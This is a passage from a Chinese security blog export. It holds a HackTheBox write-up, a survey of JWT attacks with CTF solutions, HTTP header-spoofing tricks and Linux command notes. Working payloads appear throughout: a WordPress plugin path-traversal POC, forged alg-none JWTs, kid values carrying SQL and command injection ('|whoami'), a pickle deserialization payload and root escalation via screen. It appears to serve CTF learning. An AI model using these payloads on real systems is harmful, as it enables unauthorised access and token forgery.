<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
<p>nmap -sV   -p-  –min-rate 5000 10.10.11.125</p>
</blockquote>
<img src="http://img.npfs06.top/20220331144928.png" style="zoom:80%;">

<p>开放了22和80端口，同时80端口是使用wordpress进行搭建的</p>
<p>dirsearch目录扫描下</p>
<img src="http://img.npfs06.top/20220331150440.png" style="zoom:80%;">

<p>发现存在目录遍历漏洞</p>
<img src="http://img.npfs06.top/20220331150816.png" style="zoom:80%;">

<img src="http://img.npfs06.top/20220331150910.png" style="zoom:80%;">

<p>并在plugins目录下发现一个ebook插件，找下相关漏洞</p>
<img src="http://img.npfs06.top/20220331151047.png" style="zoom:80%;">

<p>相关漏洞：</p>
<blockquote>
<p>WordPress Plugin eBook Download 1.1 - Directory Traversal  </p>
</blockquote>
<img src="http://img.npfs06.top/20220331151242.png" style="zoom:80%;">

<p>存在任意文件下载</p>
<p>POC：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/wp-content/</span>plugins<span class="regexp">/ebook-download/</span>filedownload.php?ebookdownloadurl=..<span class="regexp">/../</span>../wp-config.php</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20220331151743.png" style="zoom:80%;">

<p>下载下来发现了数据库密码，但是连不上没什么用</p>
<p>卡住了，不知道怎么进行下去，参考了下网上的思路，发现在端口扫描的步骤漏扫的一个1337端口…</p>
<p>换rustscan (<a href="https://github.com/RustScan/RustScan">https://github.com/RustScan/RustScan</a>) 之后扫到1337端口</p>
<img src="http://img.npfs06.top/20220331160007.png" style="zoom:80%;">

<p>仅凭1337端口，判断不出来什么服务架设在该端口上，结合前面ebook插件的任意文件读取漏洞，尝试爆破<code>/proc/&#123;PID&#125;/cmdline</code>对进程信息进行读取</p>
<img src="http://img.npfs06.top/20220331162525.png" style="zoom:80%;">

<p>1337端口上架设的是一个gdbserver的服务</p>
<p>之后就是使用msf的相应模块进行攻击</p>
<img src="http://img.npfs06.top/20220331164440.png" style="zoom:80%;">

<p>获得交互式shell </p>
<blockquote>
<p>python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
</blockquote>
<img src="http://img.npfs06.top/20220331164847.png" style="zoom:80%;">

<p>得到第一个flag</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><img src="http://img.npfs06.top/20220331212945.png" style="zoom:80%;">

<p>前面爆破进程的时候注意到一个screen ,考虑利用screen进行提权</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Screen</span>可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能，用户可以建立多个<span class="keyword">screen</span>会话，每个<span class="keyword">screen</span>会话又可以建立多个<span class="built_in">window</span>窗口，每一个窗口就像一个可操作的真实的ssh终端一样。</span><br></pre></td></tr></table></figure>
<p>因为使用screen时，需要先配置xterm，因此设置环境变量TREM为<code>xterm</code>：<br><code>export TERM=xterm</code><br>然后通过使用<code>-x</code>参数来进入到root的session中：<br><code>screen -x root/root</code><br>这样就可以获得root权限：</p>
<img src="http://img.npfs06.top/20220331165645.png" style="zoom:80%;">

<img src="http://img.npfs06.top/20220331165219.png" style="zoom:80%;">]]></content>
      <categories>
        <category>hackthebox</category>
      </categories>
  </entry>
  <entry>
    <title>jwt攻击</title>
    <url>/2020/07/27/jwt%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>jwt及其常见攻击方法总结，附相关练习<a id="more"></a></p>
<p>首发先知社区<a href="https://xz.aliyun.com/t/9376">https://xz.aliyun.com/t/9376</a></p>
<h1 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a><strong>JWT攻击</strong></h1><p><strong>JSON Web Token（JWT）是一种用于通信双方之间传递安全信息的简洁的、URL安全的表述性声明规范，经常用在跨域身份验证</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">cookie /<span class="keyword">session</span> /jwt  不同点</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>对于一般的cookie，如果我们的加密措施不当，很容易造成信息泄露，甚至信息伪造，这肯定不是我们期望的。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="keyword">session</span>:客户端在服务端登陆成功之后，服务端会生成一个sessionID，返回给客户端，客户端将sessionID保存到cookie中，<span class="keyword">session</span>保存在服务端，当客户访问量增加时，服务端就需要存储大量的<span class="keyword">session</span>会话，对服务器有很大的考验</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>jwt:在身份验证中，当用户使用他们的凭证成功登录时，<span class="type">JSON</span> Web Token将被返回并且必须保存在本地</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>客户端身份经过服务器验证通过后，会生成带有签名的 JSON 对象并将它返回给客户端。<strong>客户端在收到这个 JSON 对象后存储起来</strong></p>
<p>在以后的请求中客户端将 JSON 对象连同请求内容一起发送给服务器，服务器收到请求后通过 JSON 对象标识用户，如果验证不通过则不返回请求的数据。</p>
<p>验证不通过的情况有很多，比如签名不正确、无权限等。<strong>在 JWT 中服务器不保存任何会话数据</strong> ，使得服务器更加容易扩展。</p>
<h2 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h2><p>它的构成：第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature).</p>
<p>类似于：</p>
<blockquote>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyMzMzIiwibmFtZSI6Im5wZnMiLCJhZG1pbiI6dHJ1ZX0.mcHAMzOrqyqLk5-tmWVp1-zdlqIVcOdv-39oQIoOWoQ</p>
</blockquote>
<hr>
<h3 id="header"><a href="#header" class="headerlink" title="header"></a><strong>header</strong></h3><p>jwt的头部承载两部分信息：</p>
<blockquote>
<p>声明类型，这里是jwt<br>声明加密的算法 通常直接使用 HMAC SHA256</p>
</blockquote>
<p>完整的头部就像下面这样的JSON：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&#x27;typ&#x27;</span>: <span class="string">&#x27;JWT&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;alg&#x27;</span>: <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a><strong>payload</strong></h3><p><strong>载荷就是存放有效信息的地方。这些有效信息包含三个部分</strong> </p>
<ul>
<li><strong>标准中注册的声明</strong></li>
<li><strong>公共的声明</strong></li>
<li><strong>私有的声明</strong></li>
</ul>
<p><strong>标准中注册的声明</strong> :</p>
<ul>
<li>iss: jwt签发者</li>
<li>sub: jwt所面向的用户</li>
<li>aud: 接收jwt的一方</li>
<li>exp: jwt的过期时间，这个过期时间必须要大于签发时间</li>
<li>nbf: 定义在什么时间之前，该jwt都是不可用的.</li>
<li>iat: jwt的签发时间</li>
<li>jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</li>
</ul>
<p><strong>公共的声明</strong> ：</p>
<p>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可进行解码.</p>
<p><strong>私有的声明</strong> ：</p>
<p>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;purplet&quot;</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;secretid&quot;</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a><strong>signature</strong></h3><p><strong>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</strong> </p>
<ul>
<li><p><strong>header (base64后的)</strong></p>
</li>
<li><p><strong>payload (base64后的)</strong></p>
</li>
<li><p><strong>secret</strong></p>
</li>
</ul>
<p>这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。加密方式如下。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">&#x27;.&#x27;</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">&#x27;secret&#x27;</span>);</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>最后将这三部分用.连接成一个完整的字符串,构成了最终的jwt。</strong></p>
<p><img src="https://img.npfs06.top/20210326205645.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><a href="https://jwt.io/" target="_blank">jwt解密网站</a></p>
<hr>
<h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a><strong>攻击方法</strong></h1><h2 id="签名无效"><a href="#签名无效" class="headerlink" title="签名无效"></a><strong>签名无效</strong></h2><p>当用户端提交请求给应用程序，服务端可能没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制。</p>
<p>直接修改payload内容，生成新token</p>
<hr>
<h2 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a><strong>空加密算法</strong></h2><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>
<p><strong>将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为null或undefined时，jsonwebtoken会采用algorithm为none进行验证</strong></p>
<p>因为alg为none,所以只要把signature设置为空（即不添加signature字段），提交到服务器，token都可以通过服务器的验证</p>
<p><img src="https://img.npfs06.top/20210326205656.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import jwt</span><br><span class="line">token &#x3D; jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  &quot;user&quot;: &quot;admin&quot;,</span><br><span class="line">&#125;,</span><br><span class="line">algorithm&#x3D;&quot;none&quot;,key&#x3D;&quot;&quot;</span><br><span class="line">).decode(encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
<p>这里需要安装pyjwt库 </p>
<blockquote>
<p>pip install PyJWT</p>
</blockquote>
<hr>
<h2 id="修改算法RS256为HS256（非对称密码–-gt-对称密码）"><a href="#修改算法RS256为HS256（非对称密码–-gt-对称密码）" class="headerlink" title="修改算法RS256为HS256（非对称密码–&gt;对称密码）"></a><strong>修改算法RS256为HS256（非对称密码–&gt;对称密码）</strong></h2><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code></p>
<blockquote>
<p>HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证<br>RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p>
</blockquote>
<p>在这两种算法中都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
<p>如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。更改算法为HS256，即不存在公钥私钥问题，因为HMAC对称密码算法只有一个key</p>
<p><img src="https://img.npfs06.top/20210326205707.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<hr>
<h2 id="爆破密钥"><a href="#爆破密钥" class="headerlink" title="爆破密钥"></a><strong>爆破密钥</strong></h2><p> JWT 的密钥爆破需要在一定的前提下进行：</p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已签名的token</li>
<li>签名用的密钥不复杂（弱密钥）</li>
</ul>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank">c-jwt-cracker</a></p>
<p><img src="https://img.npfs06.top/20210326205716.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里运行之前需要些输入make命令，创建一个jwtcrack文件</p>
<hr>
<h2 id="修改KID参数"><a href="#修改KID参数" class="headerlink" title="修改KID参数"></a><strong>修改KID参数</strong></h2><p><code>kid</code>是jwt header中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥。我们可以通过修改kid参数进行目录遍历、sql注入、命令注入等攻击</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#目录遍历</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">#sql注入</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : &quot;<span class="type">HS256</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">    &quot;</span>typ<span class="string">&quot; : &quot;</span>jwt<span class="string">&quot;,</span></span><br><span class="line"><span class="string">    &quot;</span>kid<span class="string">&quot; : &quot;</span>aaaaaaa&#x27; UNION <span class="keyword">SELECT</span> <span class="symbol">&#x27;key</span>&#x27;;<span class="comment">-- &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#命令执行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="修改JKU-X5U参数"><a href="#修改JKU-X5U参数" class="headerlink" title="修改JKU/X5U参数"></a><strong>修改JKU/X5U参数</strong></h2><p>类似于kid ,可以由用户进行输入，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。</p>
<p>JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。</p>
<p>XSU头部参数允许攻击者用于验证Token的公钥证书或证书链</p>
<hr>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a><strong>信息泄露</strong></h2><p>直接将payload用base64解密，发泄一些敏感信息</p>
<hr>
<h1 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a><strong>easy_login</strong></h1><p><img src="https://img.npfs06.top/20210326205726.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205735.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210326205745.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205754.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>分别访问这两个文件，可以猜测出存在<code>controllers/api.js</code><br>这里是怎么猜出来的，看了赵总的WP，凭经验</p>
<p>koa框架主要目录：</p>
<p><img src="https://img.npfs06.top/20210326205804.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205812.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210916132508.png" style="zoom:80%;"></p>
<p><strong>这里总的来说就是要在sid不为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间的前提下，使sid不能作为为全局变量 secrets  数组的索引，那么 secret 就会为空了</strong></p>
<p>secretid可以利用空数组绕过（ JavaScript 是一门弱类型语言，空数组与数字比较永远为真）</p>
<p><img src="https://img.npfs06.top/20210326205822.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205830.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205843.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>所以总的做法就是生成一个 secretid 为空数组的令牌，username 设置为 admin，加密方式为 none（空加密算法），即可绕过验证，使得最后登录时验证的用户名为 admin</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import jwt</span><br><span class="line">token = jwt<span class="selector-class">.encode</span>(</span><br><span class="line">&#123;<span class="string">&quot;secretid&quot;</span>:<span class="selector-attr">[]</span>,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;888&quot;</span>&#125;,</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span></span><br><span class="line">)<span class="selector-class">.decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(token)</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>==&gt; eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6Ijg4OCJ9.</p>
<p><img src="https://img.npfs06.top/20210326205854.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="ikun"><a href="#ikun" class="headerlink" title="ikun"></a><strong>ikun</strong></h1><p><img src="https://img.npfs06.top/20210326205906.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205915.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里提示我们购买lv6，写个脚本跑一下</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://4134c719-6874-41bc-962f-ab08697fbc16.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    r=requests.<span class="built_in">get</span>(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> in r.<span class="built_in">text</span>:</span><br><span class="line">       <span class="built_in">print</span> (i)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">       </span><br><span class="line">--》lv6在<span class="number">181</span>页       </span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210326205927.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205936.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205945.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>抓包，查看cookie可以看到一段JWT，看到JWT长度较短，所以考虑利用工具将JWT的第三段密钥爆破出来</p>
<p><img src="https://img.npfs06.top/20210326205954.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326210004.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326210013.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>接下去就是考察python反序列化，感兴趣的同学可以自己去做一下</p>
<p>利用reduce函数</p>
<p>反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload(),protocol=<span class="number">0</span>)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span> (a)</span><br></pre></td></tr></table></figure>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a><strong>reference</strong></h1><p><a href="https://xz.aliyun.com/t/6776#toc-6" target="_blank">攻击JWT的一些方法</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1620770" target="_blank">JWT在CTF中的问题</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>http请求包利用</title>
    <url>/2020/04/11/http%E8%AF%B7%E6%B1%82%E5%8C%85%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>HTTP请求包利用</p>
<a id="more"></a>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">某些页面要求你必须要通过http:<span class="regexp">//</span>www.xxxx.com进行访问?</span><br><span class="line"></span><br><span class="line">增加一个referer字段</span><br><span class="line">Referrer:http:<span class="regexp">//</span>www.xxxx.com  (题目要求的url) </span><br></pre></td></tr></table></figure>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">题目要求必须是某个ip地址如<span class="number">127.0.0.1</span>，才允许访问。</span><br><span class="line"></span><br><span class="line">增加一个X-Forwarded-For字段</span><br><span class="line">X-Forwarded-For：<span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">某些题目要求必须使用某个浏览器如HAHA浏览器，才允许访问。</span><br><span class="line"></span><br><span class="line">增加<span class="keyword">User</span>-Agent字段</span><br><span class="line"><span class="keyword">User</span>-Agent:HAHA</span><br></pre></td></tr></table></figure>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">页面要求必须要安装了.net <span class="number">9.0</span>版本了才能访问。</span><br><span class="line"></span><br><span class="line">修改<span class="keyword">User</span>-Agent字段</span><br><span class="line"><span class="keyword">User</span>-Agent:.NET CLR <span class="number">9</span></span><br></pre></td></tr></table></figure>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">题目要求只能外国人才能访问这个页面。</span><br><span class="line"></span><br><span class="line">修改Accept-Language字段</span><br><span class="line">Accept-Language: <span class="keyword">en</span>-<span class="keyword">US</span>,<span class="keyword">en</span>;q=0.8</span><br></pre></td></tr></table></figure>


<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">还要做一点补充</span><br><span class="line">请求方式不对的时候，可以尝试把<span class="meta">GET</span>改为POST、PUT等，会有意外的发现</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>linux文件和目录常用命令</title>
    <url>/2020/04/23/linux%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>linux文件和目录常用命令<a id="more"></a></p>
<ul>
<li>查看目录内容<ul>
<li><code>ls</code></li>
</ul>
</li>
<li>切换目录<ul>
<li><code>cd</code></li>
</ul>
</li>
<li>创建和删除操作<ul>
<li><code>touch</code></li>
<li><code>rm</code></li>
<li><code>mkdir</code></li>
</ul>
</li>
<li>拷贝和移动文件<ul>
<li><code>cp</code></li>
<li><code>mv</code></li>
</ul>
</li>
<li>查看文件内容<ul>
<li><code>cat</code></li>
<li><code>more</code></li>
<li><code>grep</code></li>
</ul>
</li>
<li>其他<ul>
<li><code>echo</code></li>
<li>重定向 <code>&gt;</code> 和 <code>&gt;&gt;</code></li>
<li>管道 <code>|</code></li>
</ul>
</li>
</ul>
<h1 id="查看目录内容"><a href="#查看目录内容" class="headerlink" title="查看目录内容"></a>查看目录内容</h1><h2 id="终端实用技巧"><a href="#终端实用技巧" class="headerlink" title="终端实用技巧"></a>终端实用技巧</h2><h3 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h3><ul>
<li>在敲出 <code>文件</code>／<code>目录</code>／<code>命令</code> 的前几个字母之后，按下 <code>tab</code> 键<ul>
<li>如果输入的没有歧义，系统会自动补全</li>
<li>如果还存在其他 <code>文件</code>／<code>目录</code>／<code>命令</code>，再按一下 <code>tab</code> 键，系统会提示可能存在的命令</li>
</ul>
</li>
</ul>
<h3 id="曾经使用过的命令"><a href="#曾经使用过的命令" class="headerlink" title="曾经使用过的命令"></a>曾经使用过的命令</h3><ul>
<li>按 <code>上</code>／<code>下</code> 光标键可以在曾经使用过的命令之间来回切换</li>
<li>如果想要退出选择，并且不想执行当前选中的命令，可以按 <code>ctrl + c</code></li>
</ul>
<h2 id="ls-命令说明"><a href="#ls-命令说明" class="headerlink" title="ls 命令说明"></a><code>ls</code> 命令说明</h2><ul>
<li><code>ls</code> 是英文单词 <strong>list</strong> 的简写，其功能为列出目录的内容，是用户最常用的命令之一，类似于 <strong>DOS</strong> 下的 <code>dir</code> 命令</li>
</ul>
<h3 id="Linux-下文件和目录的特点"><a href="#Linux-下文件和目录的特点" class="headerlink" title="Linux 下文件和目录的特点"></a>Linux 下文件和目录的特点</h3><ul>
<li>Linux <strong>文件</strong> 或者 <strong>目录</strong> 名称最长可以有 <code>256</code> 个字符</li>
<li>以 <code>.</code> 开头的文件为隐藏文件，需要用 -a 参数才能显示</li>
<li><strong>.</strong> 代表当前目录</li>
<li><strong>..</strong> 代表上一级目录</li>
</ul>
<h2 id="ls-常用选项"><a href="#ls-常用选项" class="headerlink" title="ls 常用选项"></a>ls 常用选项</h2><table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
